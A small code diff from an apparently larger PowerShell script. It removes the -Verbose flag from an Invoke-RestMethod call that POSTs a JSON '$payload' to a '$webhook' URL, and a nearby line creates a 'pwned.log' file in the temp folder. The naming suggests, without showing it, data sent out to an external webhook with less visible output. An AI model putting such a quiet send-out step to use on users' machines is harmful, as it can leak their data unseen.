@@ -40,7 +40,7 @@
     }
     
     #Send over payload, converting it to JSON
-    Invoke-RestMethod -Uri $webhook -Body ($payload | ConvertTo-Json -Depth 4) -Method POST -ContentType 'application/json' -Verbose
+    Invoke-RestMethod -Uri $webhook -Body ($payload | ConvertTo-Json -Depth 4) -Method POST -ContentType 'application/json'
 
       $generateLog = New-Item -Path $env:temp/pwned.log -ItemType File -Force
      }
